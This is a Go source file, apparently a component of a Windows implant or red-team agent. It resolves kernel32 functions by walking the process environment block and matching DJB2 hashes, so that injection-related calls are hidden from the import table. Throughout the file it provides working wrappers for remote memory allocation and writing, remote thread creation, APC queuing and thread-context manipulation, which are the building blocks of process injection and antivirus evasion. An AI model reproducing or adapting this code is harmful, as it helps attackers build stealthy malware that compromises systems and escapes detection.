//go:build windows

package agent

// API hashing (IAT removal) for Win32 functions.
//
// Functions like VirtualAlloc, CreateRemoteThread, etc. are resolved at
// runtime via PEB walk + DJB2 hash — their names never appear in the IAT
// or as plaintext import strings.
//
// Resolution chain:
//   InitAPI() → hashResolve(dllHash, fnHash)
//             → pebGetModule(dllHash)   — walks PEB.Ldr.InLoadOrderModuleList
//             → resolveExport(base, fnHash) — parses PE export directory
//
// PEB is located via NtQueryInformationProcess(ProcessBasicInformation=0).
// DLL names are matched case-insensitively; export names are also lowercased
// (so both sides of the comparison apply the same transform).
//
// Reference: agents/agent-rust/src/api_hash.rs

import (
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// djb2 computes a case-insensitive DJB2 hash of a byte slice.
// Algorithm: h = h*33 + lowercase(byte), seed = 5381.
func djb2(s []byte) uint32 {
	h := uint32(5381)
	for _, b := range s {
		if b >= 'A' && b <= 'Z' {
			b += 32
		}
		h = h*33 + uint32(b)
	}
	return h
}

// hashWideLower hashes a UTF-16LE buffer (lenBytes = byte length of the buffer,
// not character count) using the same DJB2 algorithm, lowercasing each code unit.
// Matches the Rust hash_wide_lower — only the low byte of each u16 is processed.
func hashWideLower(buf uintptr, lenBytes uint16) uint32 {
	n := int(lenBytes) / 2
	h := uint32(5381)
	for i := 0; i < n; i++ {
		wc := *(*uint16)(unsafe.Pointer(buf + uintptr(i)*2))
		lo := byte(wc & 0xFF)
		if lo >= 'A' && lo <= 'Z' {
			lo += 32
		}
		h = h*33 + uint32(lo)
	}
	return h
}

// pebGetModule walks PEB.Ldr.InLoadOrderModuleList and returns the DllBase of
// the first loaded module whose BaseDllName (case-insensitive) hashes to dllHash.
// Returns 0 if not found or if the PEB cannot be read.
//
// Memory layout used (x64):
//   PEB+0x18              → _PEB_LDR_DATA*
//   PEB_LDR_DATA+0x10     → InLoadOrderModuleList.Flink (head)
//   LDR_DATA_TABLE_ENTRY:
//     +0x00  InLoadOrderLinks.Flink
//     +0x30  DllBase
//     +0x58  BaseDllName.Length (bytes)
//     +0x60  BaseDllName.Buffer (PWSTR)
func pebGetModule(dllHash uint32) uintptr {
	type processBasicInfo struct {
		Reserved1       uintptr
		PebBaseAddress  uintptr
		Reserved2       [2]uintptr
		UniqueProcessId uintptr
		Reserved3       uintptr
	}
	var pbi processBasicInfo
	var retLen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()), // -1 pseudo-handle
		0,                                 // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 || pbi.PebBaseAddress == 0 {
		return 0
	}
	peb := pbi.PebBaseAddress

	// PEB+0x18 → _PEB_LDR_DATA*
	ldr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	if ldr == 0 {
		return 0
	}

	// _PEB_LDR_DATA+0x10 → InLoadOrderModuleList (head sentinel)
	head := ldr + 0x10
	flink := *(*uintptr)(unsafe.Pointer(head))

	for flink != 0 && flink != head {
		dllBase := *(*uintptr)(unsafe.Pointer(flink + 0x30))
		nameLen := *(*uint16)(unsafe.Pointer(flink + 0x58))
		nameBuf := *(*uintptr)(unsafe.Pointer(flink + 0x60))

		if dllBase != 0 && nameBuf != 0 && nameLen > 0 {
			if hashWideLower(nameBuf, nameLen) == dllHash {
				return dllBase
			}
		}
		// Advance: InLoadOrderLinks.Flink is the first field (offset 0).
		flink = *(*uintptr)(unsafe.Pointer(flink))
	}
	return 0
}

// resolveExport parses the PE export directory at baseAddr and returns the VA
// of the first export whose name (case-insensitive DJB2) matches fnHash.
// Returns 0 if the PE is malformed or the export is not found.
//
// PE offsets used:
//   base+0x3C          → e_lfanew
//   NT+0x78            → DataDirectory[0].VirtualAddress (export dir RVA)
//   EXPORT_DIR+0x18    → NumberOfNames
//   EXPORT_DIR+0x1C    → AddressOfFunctions  (RVA of RVA[])
//   EXPORT_DIR+0x20    → AddressOfNames      (RVA of RVA[])
//   EXPORT_DIR+0x24    → AddressOfNameOrdinals (RVA of WORD[])
func resolveExport(baseAddr uintptr, fnHash uint32) uintptr {
	if baseAddr == 0 {
		return 0
	}
	// Validate MZ signature.
	if *(*uint16)(unsafe.Pointer(baseAddr)) != 0x5A4D {
		return 0
	}
	lfanew := uintptr(*(*uint32)(unsafe.Pointer(baseAddr + 0x3C)))
	nt := baseAddr + lfanew
	// Validate PE\0\0 signature.
	if *(*uint32)(unsafe.Pointer(nt)) != 0x00004550 {
		return 0
	}
	// Export directory RVA: OptionalHeader starts at nt+0x18.
	// PE32  (Magic=0x010B): DataDirectory[0] at OptHdr+0x60 → nt+0x78.
	// PE32+ (Magic=0x020B): DataDirectory[0] at OptHdr+0x70 → nt+0x88.
	// 64-bit DLLs are always PE32+.
	magic := *(*uint16)(unsafe.Pointer(nt + 0x18))
	var expDirOffset uintptr
	if magic == 0x020B {
		expDirOffset = 0x88
	} else {
		expDirOffset = 0x78
	}
	expRVA := uintptr(*(*uint32)(unsafe.Pointer(nt + expDirOffset)))
	if expRVA == 0 {
		return 0
	}
	exp := baseAddr + expRVA

	numNames := *(*uint32)(unsafe.Pointer(exp + 0x18))
	fnArr    := baseAddr + uintptr(*(*uint32)(unsafe.Pointer(exp + 0x1C)))
	nameArr  := baseAddr + uintptr(*(*uint32)(unsafe.Pointer(exp + 0x20)))
	ordArr   := baseAddr + uintptr(*(*uint32)(unsafe.Pointer(exp + 0x24)))

	for i := uintptr(0); i < uintptr(numNames); i++ {
		nameRVA := uintptr(*(*uint32)(unsafe.Pointer(nameArr + i*4)))
		namePtr := baseAddr + nameRVA

		// Compute case-insensitive DJB2 of the null-terminated export name.
		h := uint32(5381)
		for j := uintptr(0); ; j++ {
			b := *(*byte)(unsafe.Pointer(namePtr + j))
			if b == 0 {
				break
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			h = h*33 + uint32(b)
		}

		if h == fnHash {
			ord   := uintptr(*(*uint16)(unsafe.Pointer(ordArr + i*2)))
			fnRVA := uintptr(*(*uint32)(unsafe.Pointer(fnArr + ord*4)))
			return baseAddr + fnRVA
		}
	}
	return 0
}

// hashResolve resolves a Win32 function address by DLL name hash + export name hash.
// Both hashes must be computed with djb2() (case-insensitive).
func hashResolve(dllHash, fnHash uint32) uintptr {
	base := pebGetModule(dllHash)
	if base == 0 {
		return 0
	}
	return resolveExport(base, fnHash)
}

// ApiTable holds hash-resolved function pointers for sensitive Win32 APIs.
// Entries are populated once at startup by InitAPI.
// No function name string ever appears in the IAT or as a plaintext import.
type ApiTable struct {
	VirtualAlloc        uintptr
	VirtualAllocEx      uintptr
	VirtualProtect      uintptr
	VirtualProtectEx    uintptr
	VirtualFree         uintptr
	WriteProcessMemory  uintptr
	ReadProcessMemory   uintptr
	CreateRemoteThread  uintptr
	OpenProcess         uintptr
	OpenThread          uintptr
	SuspendThread       uintptr
	ResumeThread        uintptr
	GetThreadContext    uintptr
	SetThreadContext    uintptr
	QueueUserAPC        uintptr
	CreateThread        uintptr
	WaitForSingleObject uintptr
	CloseHandle         uintptr
	TerminateProcess    uintptr
	CreateProcessW      uintptr
	LoadLibraryA        uintptr
	GetProcAddress      uintptr
}

var (
	// API is the global resolved function table. Access after InitAPI() returns.
	API     ApiTable
	apiOnce sync.Once
)

// InitAPI resolves all API table entries via PEB walk + DJB2 hash.
// Thread-safe and idempotent — safe to call multiple times.
func InitAPI() {
	apiOnce.Do(func() {
		k32 := djb2([]byte("kernel32.dll"))
		API.VirtualAlloc        = hashResolve(k32, djb2([]byte("VirtualAlloc")))
		API.VirtualAllocEx      = hashResolve(k32, djb2([]byte("VirtualAllocEx")))
		API.VirtualProtect      = hashResolve(k32, djb2([]byte("VirtualProtect")))
		API.VirtualProtectEx    = hashResolve(k32, djb2([]byte("VirtualProtectEx")))
		API.VirtualFree         = hashResolve(k32, djb2([]byte("VirtualFree")))
		API.WriteProcessMemory  = hashResolve(k32, djb2([]byte("WriteProcessMemory")))
		API.ReadProcessMemory   = hashResolve(k32, djb2([]byte("ReadProcessMemory")))
		API.CreateRemoteThread  = hashResolve(k32, djb2([]byte("CreateRemoteThread")))
		API.OpenProcess         = hashResolve(k32, djb2([]byte("OpenProcess")))
		API.OpenThread          = hashResolve(k32, djb2([]byte("OpenThread")))
		API.SuspendThread       = hashResolve(k32, djb2([]byte("SuspendThread")))
		API.ResumeThread        = hashResolve(k32, djb2([]byte("ResumeThread")))
		API.GetThreadContext     = hashResolve(k32, djb2([]byte("GetThreadContext")))
		API.SetThreadContext     = hashResolve(k32, djb2([]byte("SetThreadContext")))
		API.QueueUserAPC        = hashResolve(k32, djb2([]byte("QueueUserAPC")))
		API.CreateThread        = hashResolve(k32, djb2([]byte("CreateThread")))
		API.WaitForSingleObject = hashResolve(k32, djb2([]byte("WaitForSingleObject")))
		API.CloseHandle         = hashResolve(k32, djb2([]byte("CloseHandle")))
		API.TerminateProcess    = hashResolve(k32, djb2([]byte("TerminateProcess")))
		API.CreateProcessW      = hashResolve(k32, djb2([]byte("CreateProcessW")))
		API.LoadLibraryA        = hashResolve(k32, djb2([]byte("LoadLibraryA")))
		API.GetProcAddress      = hashResolve(k32, djb2([]byte("GetProcAddress")))
	})
}

func init() {
	InitAPI()
}

// ── Typed call wrappers ───────────────────────────────────────────────────────
//
// Each wrapper calls through the hash-resolved function pointer using
// syscall.Syscall* so the call bypasses the import table entirely.

func apiVirtualAlloc(addr, size, allocType, protect uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.VirtualAlloc, 4, addr, size, allocType, protect, 0, 0)
	return r
}

func apiVirtualAllocEx(hProcess, addr, size, allocType, protect uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.VirtualAllocEx, 5, hProcess, addr, size, allocType, protect, 0)
	return r
}

func apiVirtualProtect(addr, size, protect, oldProtect uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.VirtualProtect, 4, addr, size, protect, oldProtect, 0, 0)
	return r
}

func apiVirtualProtectEx(hProcess, addr, size, protect, oldProtect uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.VirtualProtectEx, 5, hProcess, addr, size, protect, oldProtect, 0)
	return r
}

func apiVirtualFree(addr, size, freeType uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.VirtualFree, 3, addr, size, freeType)
	return r
}

func apiWriteProcessMemory(hProcess, baseAddr, buf, size, written uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.WriteProcessMemory, 5, hProcess, baseAddr, buf, size, written, 0)
	return r
}

func apiReadProcessMemory(hProcess, baseAddr, buf, size, read uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.ReadProcessMemory, 5, hProcess, baseAddr, buf, size, read, 0)
	return r
}

func apiCreateRemoteThread(hProcess, sec, stackSz, start, param, flags, tid uintptr) uintptr {
	r, _, _ := syscall.Syscall9(API.CreateRemoteThread, 7, hProcess, sec, stackSz, start, param, flags, tid, 0, 0)
	return r
}

func apiOpenProcess(access, inherit, pid uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.OpenProcess, 3, access, inherit, pid)
	return r
}

func apiOpenThread(access, inherit, tid uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.OpenThread, 3, access, inherit, tid)
	return r
}

func apiSuspendThread(hThread uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.SuspendThread, 1, hThread, 0, 0)
	return r
}

func apiResumeThread(hThread uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.ResumeThread, 1, hThread, 0, 0)
	return r
}

func apiGetThreadContext(hThread, ctx uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.GetThreadContext, 2, hThread, ctx, 0)
	return r
}

func apiSetThreadContext(hThread, ctx uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.SetThreadContext, 2, hThread, ctx, 0)
	return r
}

func apiQueueUserAPC(fn, thread, data uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.QueueUserAPC, 3, fn, thread, data)
	return r
}

func apiCreateThread(sec, stack, start, param, flags, tid uintptr) uintptr {
	r, _, _ := syscall.Syscall6(API.CreateThread, 6, sec, stack, start, param, flags, tid)
	return r
}

func apiWaitForSingleObject(handle, ms uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.WaitForSingleObject, 2, handle, ms, 0)
	return r
}

func apiCloseHandle(handle uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.CloseHandle, 1, handle, 0, 0)
	return r
}

func apiTerminateProcess(hProcess, exitCode uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.TerminateProcess, 2, hProcess, exitCode, 0)
	return r
}

// apiCreateProcessW calls CreateProcessW with 10 arguments.
func apiCreateProcessW(appName, cmdLine, procAttr, threadAttr, inheritHandles, creationFlags, env, curDir, si, pi uintptr) uintptr {
	r, _, _ := syscall.SyscallN(API.CreateProcessW, appName, cmdLine, procAttr, threadAttr, inheritHandles, creationFlags, env, curDir, si, pi)
	return r
}

func apiLoadLibraryA(namePtr uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.LoadLibraryA, 1, namePtr, 0, 0)
	return r
}

// apiGetProcAddress calls GetProcAddress. nameOrOrd is either a pointer to a
// null-terminated function name or a low-word ordinal (for ordinal imports).
func apiGetProcAddress(hModule, nameOrOrd uintptr) uintptr {
	r, _, _ := syscall.Syscall(API.GetProcAddress, 2, hModule, nameOrOrd, 0)
	return r
}
